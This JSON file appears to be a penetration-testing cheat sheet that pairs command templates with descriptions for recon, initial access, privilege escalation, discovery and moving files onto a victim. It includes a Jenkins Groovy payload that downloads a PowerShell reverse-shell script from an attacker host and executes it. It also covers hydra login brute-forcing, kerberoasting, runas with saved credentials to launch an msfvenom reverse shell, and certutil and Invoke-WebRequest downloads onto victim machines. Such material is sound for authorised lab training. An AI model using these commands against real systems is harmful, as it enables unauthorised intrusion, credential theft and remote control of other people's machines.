{
    "recon":
    [
        {   
            "command": "nmap -sC -sV -oA [name] [address]",
            "section": "Recon",
            "description": "This will save the results in three file formats: '.nmap', '.gmap', and '.xml' (The '.nmap' file will store the output as you would normally see it on the terminal.)"
        },
        {
            "command": "nmap -p- -sC -sV -oA [name] [address]",
            "section": "Recon",
            "description": "Similar to the basic nmap scan except it will check all ports, the '-oA' will save it in the three main file formats, you don't have to include this."
        },
        {
            "command": "smbmap -H [IP] -d [domain]",
            "section": "Recon",
            "description": "Enumerate available SMB shares. For the IP address, you don't have to indicate the port, just put the IP address."
        },
        {
            "command": "dirb [url] [wordlist]",
            "section": "Recon",
            "description": "Can also utilize the GUI version dirbuster (though I find that to be slower)."
        },
        {
            "command": "gobuster dir -u [address] -w [wordlist] -o [name] -t [threads]",
            "section": "Recon",
            "description": "On Kali Linux, wordlists stored under /usr/share/wordlists/. In the example, the '-o' and the '-t' flags are not necessasry."
        },
        {
            "command": "wfuzz --hc 404 -Z -w [wordlist] -u [domain]/FUZZ/[file name]",
            "section": "Recon",
            "description": "This situation/example was from a HackTheBox challenge (Obscurity) where it was discovered that there was a file named 'SuperSecureServer.py' in some unknown directory. In this case, I used wfuzz to find what the directory name is. It will replace 'FUZZ' with every word in the wordlists."
        },
        {
            "command": "wfuzz --sc 200 -w [wordlist] -H \"Host: FUZZ.[domain]\" -u [domain]",
            "section": "Recon",
            "description": "Needs to have the quotation marks."
        },
        {
            "command": "python3 sublist3r.py -d [domain]",
            "section": "Recon",
            "description": "Needs to be installed: sudo git clone https://github.com/aboul3la/Sublist3r /opt/sublist3r"
        },
        {
            "command": "enum4linux [address]",
            "section": "Recon",
            "description": "The output is pretty noisy, recommend outputing to file."
        },
        {
            "command": "wpscan --url [address] --enumerate u",
            "section": "Recon",
            "description": "Enumerate users on a WordPress website."
        },
        {
            "command": "wpscan --url [address] --enumerate p",
            "section": "Recon",
            "description": "Enumerate plugins on a WordPress website."
        }
    ],
    
    "init":
    [
        {
            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[login page uri]:__VIEWSTATE=[full viewstate from burp suite]:[string that displays failed attempt]\"",
            "section": "Initial Access",
            "description": "Using hydra to brute force a login web page. "
        },
        {
            "command": "smbclient \\\\[IP]\\[share]",
            "section": "Initial Access",
            "description": "Access a SMB share that you have access to. Remember to account for escape characters in bash. Might need to add two backslashes before the IP address and one one before the share name."
        },
        {
            "command": "groovy> cmd = \"powershell iex (New-Object Net.WebClient).DownloadString('[attacker ip]:[attacker web port]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [attacker ip] -Port [attacker listening port]\"<br><br>groovy> cmd.execute()",
            "section": "Initial Access",
            "description": "If you have access to the Jenkins webpage (requires login) you can get to the script console page. This page will execute groovy commands which can be utilized to perform remote code execution. By utilizing nishang powershell scripts (specifically the reverse shell module Invoke-PowerShellTcp.ps1), you can load the script and execute it to gain initial access. The above command requires the attacker machine to have a webserver running with nishang's Invoke-PowerShellTcp.ps1 module."
        }
    ],

    "privesc":
    [
        {
            "command": "GetUserSPNs.py -request -dc-ip [ip] [domain name]/[user][password]",
            "section": "Privilege Escalation",
            "description": "[Windows] Performs a kerberoast attack using the Impacket toolkit. This requires you to have an authorized username and password and for active directory to be enabled on the victim machine. "
        },
        {
            "command": "runas /savecred /user:[escalated user] \"[exe path]\"",
            "section": "Privilege Escalation",
            "description": "[Windows] If you see that runas /savecred is available or have identified stored credentials for a privileged user, you can run commands as that privileged user without supplying a password. Generate a reverse shell using msfvenom, upload to victim system, and run it using the runas command."
        },
        {
            "command": "GTFObins",
            "section": "Privilege Escalation",
            "description" : "[Windows][Linux] Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
        },
        {
            "command": "sudo -l",
            "section": "Privilege Escalation",
            "description": "[Linux] This checks for sudo commands that can be run without supplying a password. Can potentially be paired with GTFOBins."
        }
    ],

    "discovery":
    [
        {
            "command": "Using winPEAS",
            "section": "Discovery",
            "description": "[Windows] WinPEAS is exclusive to Windows - linPEAS is the linux equiavlent. There is x86 and x64 versions available, do the 'systeminfo' command on cmd.exe to see the computer architecture. There is a lot of output, so would recommend outputting to a file."
        },
        {
            "command": "Using windows-exploit-suggester",
            "section": "Discovery",
            "description": "[Windows]<br>1. On the (victim) windows shell, do 'systeminfo' and save the output. <br><br> 2. On the kali (attacker) system, do 'python windows-exploit-suggester.py --update'. This should output an xls or xlsx file. <br><br> 3. (Might have to do 'pip install xlrd') Then do 'python windows-exploit-suggester.py --database [.xls file] --systeminfo [systeminfo file]'. From their github page: \"This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.\""
        },
        {
            "command": "net user [user]",
            "section": "Discovery",
            "description": "[Windows] Gets information on the user, can be utilized to check what groups a user is in. Groups will be listed under Global Group Memberships and/or Local Group Memberships"
        },
        {
            "command": "cmdkey /list",
            "section": "Discovery",
            "description": "[Windows] Identify stored credentials. If you see a priviliged level user (admin/administrator), check the corresponding runas command in the privesc section."
        },
        {
            "command": "Get-ADGroupMember [AD Group] | select name",
            "section": "Discovery",
            "description": "[Windows] PowerShell command that gets all members of the AD (Active Directory) group, then from that list only output the names."
        },
        {
            "command": "cat /etc/passwd",
            "section": "Discovery",
            "description": "[Linux] Check the /etc/passwd file for the list o users that are present on the system."
        },
        {
            "command": "find [directory] -user [user] 2>&1 | grep -v \"Permission denied\"",
            "section": "Discovery",
            "description": "[Linux] Finds all files starting from the directory supplied that is owned by the user. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
        },
        {
            "command": "find [directory] -group [group] 2>&1 | grep -v \"Permission denied\"",
            "section": "Discovery",
            "description": "[Linux] Finds all files starting from the directory supplised that is owned by the group. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
        },
        {
            "command": "netstat -tulp",
            "section": "Discovery",
            "description": "[Linux] Utilizes the netstat command to look for tcp (the t in the command) and udp (the u in the command) ports that are listening (l) and prints output with program names (p)."
        }
    ],

    "file":
    [
        {
            "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
            "section": "Exfiltration/File Movement",
            "description": "[Windows] Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
        },
        {
            "command": "certutil.exe -urlcache -f [address] [output name]",
            "section": "Exfiltration/File Movement",
            "description": "[Windows] Download files to the victim system using native OS binary."
        },
        {
            "command": "ftp> get \"[file name]\"",
            "section": "Exfiltration/File Movement",
            "description": "Downloads files from an FTP server. It’s important to distinguish if you need to utilize FTP’s ASCII mode or Binary mode as initially when connecting to a FTP server, ASCII mode is the default mode. To change mode you can simply type 'binary' in the FTP shell. File types to use ASCII mode: txt, asp, html, php (generally text-based files such as source code, web pages, etc). File types to use binary mode: jpg, gif, wav, mp3, mp4, zip, tar, exe, pdf, mdb (generally image files, sound files, video files, archive files, etc)."
        }
    ]
}